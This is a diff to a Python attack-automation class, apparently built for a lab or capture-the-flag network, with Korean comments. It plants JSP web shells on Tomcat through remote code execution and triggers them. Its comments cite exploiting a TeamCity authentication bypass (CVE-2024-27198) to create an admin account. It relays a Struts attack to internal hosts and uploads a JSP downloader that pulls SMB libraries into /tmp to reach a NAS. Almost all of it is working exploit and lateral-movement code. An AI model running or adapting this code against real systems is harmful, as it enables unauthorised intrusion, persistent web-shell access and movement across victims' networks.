@@ -21,7 +21,7 @@ class LateralMovementCoordinator:
         self.pwd = pwd
         
         self.teamcity_url = None
-        self.proxy_shell_url = f"{parsed.scheme}://{parsed.netloc}/spring-form/proxy.jsp"
+        self.proxy_shell_url = f"{parsed.scheme}://{parsed.netloc}/proxy.jsp"
         self.struts_shell_url = "http://struts:8080/upload/uploads/faces/index.jsp;x"
         self.struts_db_shell_url = "http://struts:8080/upload/uploads/faces/strutsdb.jsp;x"
         self.nas_shell_url = f"{parsed.scheme}://{parsed.netloc}/nasshell.jsp"
@@ -97,7 +97,7 @@ try {
     conn.disconnect();
 } catch (Exception e) { out.println("Error: " + e.getMessage()); }
 %>"""
-        self._upload_jsp_via_echo(proxy_jsp, "webapps/spring-form/proxy.jsp")
+        self._upload_jsp_via_echo(proxy_jsp, "/usr/local/tomcat/webapps/ROOT/proxy.jsp")
         results.append(f"[SUCCESS] Proxy Shell 활성화: {self.proxy_shell_url}")
 
         # 3. TeamCity 인증 우회 공격 (CVE-2024-27198) - 관리자 계정 생성
@@ -174,9 +174,9 @@ try {{
 }} catch (Exception e) {{ out.println("Error: " + e.getMessage()); }}
 %>"""
         
-        self._upload_jsp_via_echo(struts_sender_jsp, "webapps/spring-form/struts_attack.jsp")
+        self._upload_jsp_via_echo(struts_sender_jsp, "/usr/local/tomcat/webapps/ROOT/struts_attack.jsp")
         parsed = urlparse(self.shell_url)
-        attack_trigger_url = f"{parsed.scheme}://{parsed.netloc}/spring-form/struts_attack.jsp"
+        attack_trigger_url = f"{parsed.scheme}://{parsed.netloc}/struts_attack.jsp"
         requests.get(attack_trigger_url, timeout=15)
         time.sleep(2)
         
@@ -202,20 +202,29 @@ try {{
         results = []
         results.append("[*] NAS SMB 통신을 위한 외부 Java 라이브러리(JCIFS-NG) Maven 강제 다운로드 중...")
         
-        # Maven에서 jar 다운로드
-        download_cmds = [
-            "curl -L -s -o /tmp/jcifs-ng-2.1.9.jar https://repo1.maven.org/maven2/eu/agno3/jcifs/jcifs-ng/2.1.9/jcifs-ng-2.1.9.jar",
-            "curl -L -s -o /tmp/slf4j-api-1.7.36.jar https://repo1.maven.org/maven2/org/slf4j/slf4j-api/1.7.36/slf4j-api-1.7.36.jar",
-            "curl -L -s -o /tmp/slf4j-simple-1.7.36.jar https://repo1.maven.org/maven2/org/slf4j/slf4j-simple/1.7.36/slf4j-simple-1.7.36.jar"
-        ]
-        fail = False
-        for cmd in download_cmds:
-            self.execute_rce(cmd)
-            
+        # Maven에서 jar 다운로드 (curl이 없는 환경 대응용 JSP Downloader)
+        downloader_jsp = """<%@ page import="java.net.*,java.io.*,java.nio.file.*" %>
+<%
+String[] urls = {
+    "https://repo1.maven.org/maven2/eu/agno3/jcifs/jcifs-ng/2.1.9/jcifs-ng-2.1.9.jar",
+    "https://repo1.maven.org/maven2/org/slf4j/slf4j-api/1.7.36/slf4j-api-1.7.36.jar",
+    "https://repo1.maven.org/maven2/org/slf4j/slf4j-simple/1.7.36/slf4j-simple-1.7.36.jar"
+};
+for(int i=0; i<urls.length; i++) {
+    try (InputStream in = new URL(urls[i]).openStream()) {
+        Files.copy(in, Paths.get("/tmp/" + urls[i].substring(urls[i].lastIndexOf("/")+1)), StandardCopyOption.REPLACE_EXISTING);
+    } catch(Exception e) {}
+}
+out.print("OK");
+%>"""
+        self._upload_jsp_via_echo(downloader_jsp, "/usr/local/tomcat/webapps/ROOT/downloader.jsp")
+        parsed = urlparse(self.shell_url)
+        requests.get(f"{parsed.scheme}://{parsed.netloc}/downloader.jsp", timeout=20)
+        
         # JAR 존재 여부 확인
         ls_res = self.execute_rce("ls -la /tmp/*.jar")
         if "jcifs" not in ls_res:
-             results.append("[FAIL] Maven에서 JCIFS 다운로드 모듈을 받아오지 못했습니다. 네트워크 통신이 막혀있을 수 있습니다.")
+             results.append("[FAIL] Maven에서 JCIFS 다운로드 모듈을 받아오지 못했습니다.")
              return "\n".join(results)
              
         results.append("[SUCCESS] SMB 라이브러리 다운로드 완료.")
@@ -267,7 +276,7 @@ try {
     cl.close();
 } catch (Exception e) { out.println("[ERROR] " + e.getMessage()); }
 %>"""
-        self._upload_jsp_via_echo(nas_jsp, "webapps/ROOT/nasshell.jsp")
+        self._upload_jsp_via_echo(nas_jsp, "/usr/local/tomcat/webapps/ROOT/nasshell.jsp")
         time.sleep(2)
         
         # NAS 접근
